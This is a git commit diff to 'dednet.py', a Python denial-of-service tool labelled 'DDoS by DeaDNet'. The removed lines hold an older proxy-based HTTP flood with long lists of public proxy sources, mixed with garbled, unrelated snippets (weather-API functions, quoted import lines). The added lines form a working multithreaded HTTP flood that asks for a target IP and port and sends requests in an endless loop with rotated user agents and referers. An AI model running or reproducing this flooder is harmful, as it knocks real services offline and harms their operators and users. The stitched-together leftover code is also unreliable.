fe2fca477e7e962ba9cc0e8b200016b2f3d0a52e
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-09 02:48:52 +0300

    Update dednet.py

--- dednet.py
+++ dednet.py
@@ -34,265 +34,69 @@ os.system("clear")
 print(green + f"З А Г Р У З К А....")
 time.sleep(1.5)
 os.system("clear")
-print("DDoS Layer7:")
-print(red + f"DDoS by DeaDNet")
-upl = input(cyan + "[DATA]  UPL: => ")
-THEARD = int(input(yellow + "[DATA]  Theards: => "))
 
-method = input(white + "[DATA]  method: => ")
+#Ultra DDOS
 
-method = input(black + "[proxy]  proxy.txt: => ")
-#proxy
-proxies = {
-    'http': '8.8.8.8:9000',
-    'http': '7.6.5.4:9000'
-}
-proxies = []
-for proxy in proxies:
-    response = requests.get(proxies=proxy)
-    if response.status_code == requests.codes['ok']:
-        break
-        proxyResources = [
-    'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
-    'https://www.proxyscan.io/download?type=socks5',
-    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
-]
-proxy_resources = [
-    'https://www.proxyscan.io/download?type=socks4',
-    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
-    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt',
-    'https://api.openproxylist.xyz/socks4.txt',
-    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt',
-    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt',
-    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true',
-    'https://www.proxyscan.io/download?type=socks5',
-    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
-    'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
-    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt',
-    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt',
-    'https://api.openproxylist.xyz/socks5.txt',
-    'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
-    'https://www.proxyscan.io/download?type=http',
-    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
-    'https://api.openproxylist.xyz/http.txt',
-    'https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt',
-    'http://alexa.lr2b.com/proxylist.txt',
-    'http://rootjazz.com/proxies/proxies.txt',
-    'http://proxysearcher.sourceforge.net/Proxy%20List.php?type=http',
-    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt',
-    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
-    'https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt',
-    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
-    'https://proxy-spider.com/api/proxies.example.txt',
-    'https://multiproxy.org/txt_all/proxy.txt',
-    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
-    'https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt',
-    'https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt',
-    'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all',
-    'https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc',
-    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
-    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies.txt',
-    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies2.txt',
-    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies3.txt',
-    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies4.txt'
-]
-def steal_proxies(site):
-    try:
-        data = requests.get(site)
-        text_for_parse = data.text
-        res = text_for_parse.split()
-        with open('proxy.txt', 'a', encoding='utf8', errors='ignore') as proxy_file:
-            proxy_file.writelines('\n'.join(res))
-        return True
-    except Exception as Error:
-        return Error
+useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
+"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
+"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
+"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
+"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
+"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
+"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
+"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
+"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
+"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
 
+ref=['http://www.bing.com/search?q=',
+'https://www.google.com.com/search/q=',
+'https://duckduckgo.com/?q=',
+'https://yahoo.com/search?p=']
 
-def count_proxies():
-    try:
-        proxies = sum(1 for line in open('proxy.txt', 'r'))
-        return proxies
-    except Exception as Error:
-        return Error
-#methods
-def AttackPXHTTP2(url, until_datetime):
-    headers = {
-            'User-Agent': random.choice(ua),
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-User': '?1',
-            'TE': 'trailers',
-            }
-    
-    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+"Accept-Encoding: gzip, deflate\r\n",
+"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
+"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+"Accept-Language: en-US,en;q=0.5\r\n"]
+
+ip = str(input(' Target/IP:=> '))
+port = int(input(' Port:=> '))
+pack = int(input(' Packet/s:=> '))
+thread = int(input(' Threads/Потоки:=> '))
+
+def start():
+    global useragents, ref, acceptalln
+    hh = random._urandom(3016)
+    xx = int(0)
+    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
+    accept = random.choice(acceptall)
+    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
+    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
+    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
+    main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
+    while True:
         try:
-            client = httpx.Client(
-                http2=True,
-                proxies={
-                    'http://': 'http://'+random.choice(proxies),
-                    'https://': 'http://'+random.choice(proxies),
-                }
-             )
-            client.get(url, headers=headers)
-            client.get(url, headers=headers)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((str(ip),int(port)))
+            s.send(str.encode(main_req))
+            for i in range(pack):
+                s.send(str.encode(main_req))
+            xx += random.randint(0, int(pack))
+            print("Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
         except:
-            pass
+            s.close()
+            print('SUCCESFUL KNOCKED DOWN THE SERVER')
 
-def test1(url, th, t):
-    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    target = get_target(url)
-    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
-    req += 'Host: ' + target['host'] + '\r\n'
-    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
-    req += 'Accept-Encoding: gzip, deflate, br\r\n'
-    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
-    req += 'Cache-Control: max-age=0\r\n'
-    #req += 'Cookie: ' + cookie + '\r\n'
-    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
-    req += 'sec-ch-ua-mobile: ?0\r\n'
-    req += 'sec-ch-ua-platform: "Windows"\r\n'
-    req += 'sec-fetch-dest: empty\r\n'
-    req += 'sec-fetch-mode: cors\r\n'
-    req += 'sec-fetch-site: same-origin\r\n'
-    req += 'Connection: Keep-Alive\r\n'
-    req += 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en\r\n\r\n\r\n'
-    for _ in range(int(th)):
-        try:
-            thd = threading.Thread(target=test2,args=(until, target, req,))
-            thd.start()
-        except:  
-            pass            
-#proxy
-def test2(until_datetime, target, req):
-    if target['scheme'] == 'https':
-        packet = socks.socksocket()
-        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-        packet.connect((str(target['host']), int(target['port'])))
-        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
-    else:
-        packet = socks.socksocket()
-        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-        packet.connect((str(target['host']), int(target['port'])))
-    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-        try:
-            for _ in range(10):
-                packet.send(str.encode(req))
-        except:
-            packet.close()
-            pass
-    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-        try:
-            scraper.get(url=url, headers=headers, allow_redirects=False)
-            scraper.get(url=url, headers=headers, allow_redirects=False)           
-            
-        except:
-            pass
-def get_weathermap(self):
-        try:
-            rq=requests.get(f'api.openweathermap.org/data/2.5/weather?lat=35&lon=139')
-            self.is_200(rq)
-
-            res=rq.json()#json.loads(rq.text)
-            self.is_success_api(res)
-        except:
-            print('EXCEPTION: get_weathermap >',sys.exc_info())
-
-def get_weathermap(self):
-        try:
-            http_proxy = "http://108.61.209.46:3128"
-            https_proxy = "https://108.61.209.46:3128"
-            ftp_proxy = "ftp://108.61.209.46:3128"
-
-            proxyDict = {
-                "http": http_proxy,
-                "https": https_proxy,
-                "ftp": ftp_proxy
-            }
-            rq=requests.get(f'api.openweathermap.org/data/2.5/weather?lat=35&lon=139', proxies = proxyDict)
-            self.is_200(rq)
-
-            res=rq.json()#json.loads(rq.text)
-            self.is_success_api(res)
-        except:
-            print('EXCEPTION: get_weathermap >',sys.exc_info())            
-"response.text"
-#Запросы 
-"import requests"
- 
-"ssn = requests.Session()"
-"ssn.cookies.update({visit-month: February})"
- 
-"reqOne = ssn.get(<a href=http://httpbin.org/cookies>http://httpbin.org/cookies</a>)"
-"print(reqOne.text)"
-# prints information about "visit-month" cookie
- 
-"reqTwo = ssn.get(<a href=http://httpbin.org/cookies>http://httpbin.org/cookies</a>, cookies={visit-year: 2017})"
-"print(reqTwo.text)"
-# prints information about "visit-month" and "visit-year" cookie
- 
-"reqThree = ssn.get(<a href=http://httpbin.org/cookies>http://httpbin.org/cookies</a>)"
-"print(reqThree.text)"
-# prints information about "visit-month" cookie
-# Stats
-sent = 0
-error = 0
-#packets
-"import httpx"
-"import pystyle"
-"import socks"
-"import pysocks"
-"import requests"
-"import icmplib"
-"import dnspython"
-"import cloudscraper"
-"import colorama"
-"import shutup"
-"import undetected_chromedriver"
-"import psutil"
-"import flask"
-"import wget"
-#packets
-"package"
-" __init__.py"
-# file __init__.py
-NAME = 'super_package'
-"import package"
-
-"print(package.NAME)"
-"package"
-"constants.py"
-"functions.py"
-"__init__.py"
-# file constants.py
-PERSON = 'DDoS'
-# file functions.py
-def greet(who):
-    print('New, ' + who + '!')
-"import package.functions"
-"import package.constants"
-
-"from . import module"
-"from .module import function"
-"from .subpackage.module import CONSTANT"   
-# DDoS
-print(  "Zapusk")
-while True:
-    try:
-        s = socket.socket(9)
-        s.connect((upl, int(theard)))
-        sent +=0
-        print(green + f"[LOG] Loading {sent} ")
-        print("DDoS")
-    except OSError: 
-        error +=1
-        print(pink + f"[DDoS] PACKETS {error}")
-        "print(cyan + f( DDoS)"
+for x in range(thread):
+    thred = threading.Thread(target=start)
+    thred.start()
     
